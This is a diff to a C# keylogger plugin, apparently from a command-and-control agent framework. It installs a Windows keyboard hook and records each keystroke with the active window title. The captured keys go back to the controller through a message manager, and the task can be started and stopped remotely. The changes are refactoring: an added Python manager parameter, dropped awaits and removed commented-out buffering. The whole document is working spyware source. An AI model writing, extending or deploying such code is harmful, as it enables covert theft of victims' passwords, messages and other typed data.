@@ -1,7 +1,6 @@
 ﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Text.Json;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
@@ -16,13 +15,12 @@ namespace Agent
         public CancellationTokenSource cts = new CancellationTokenSource();
         private IMessageManager messageManager { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
         }
         public async Task Execute(ServerJob job)
         {
-
             Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
             if (args["action"].ToLower() == "stop")
             {
@@ -30,25 +28,24 @@ namespace Agent
                 {
                     cts.Cancel();
                     this.isRunning = false;
-                    await messageManager.WriteLine("Tasked to stop.", job.task.id, true);
+                    messageManager.WriteLine("Tasked to stop.", job.task.id, true);
                 }
                 else
                 {
-                    await messageManager.WriteLine("Task is not running.", job.task.id, true);
+                    messageManager.WriteLine("Task is not running.", job.task.id, true);
                 }
+                return;
+            }
+
+            if(!this.isRunning)
+            {
+                cts = new CancellationTokenSource();
+                StartKeylogger(job.task.id);
+                messageManager.WriteLine("Keylogger started.", job.task.id, true);
             }
             else
             {
-                if(!this.isRunning)
-                {
-                    cts = new CancellationTokenSource();
-                    StartKeylogger(job.task.id);
-                    await messageManager.WriteLine("Keylogger started.", job.task.id, true);
-                }
-                else
-                {
-                    await messageManager.WriteLine("Already running", job.task.id, true);
-                }
+                messageManager.WriteLine("Already running", job.task.id, true);
             }
         }
         public bool StartKeylogger(string task_id)
@@ -65,7 +62,7 @@ namespace Agent
                 while (!cts.Token.IsCancellationRequested)
                 {
                     Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                    System.Threading.Thread.Sleep(5);
+                    Thread.Sleep(5);
                 }
 
                 Native.UnhookWindowsHookEx(hook);
@@ -437,17 +434,7 @@ namespace Agent
 
                 StringBuilder title = new StringBuilder(256);
                 Native.GetWindowText(hWindow, title, title.Capacity);
-
-
                 messageManager.AddKeystroke(title.ToString(), this.task_id, key);
-
-
-                //if (!this._keylogOutput.ContainsKey(title.ToString()))
-                //{
-                //    this._keylogOutput.Add(title.ToString(), new StringBuilder());
-                //}
-                //Console.Write(key);
-                //this._keylogOutput[title.ToString()].Append(key);
             }
         }
         private IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
@@ -455,9 +442,6 @@ namespace Agent
             HandleKeyStroke(code, wParam, lParam);
             return Native.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
-
-
-
     }
 }
 
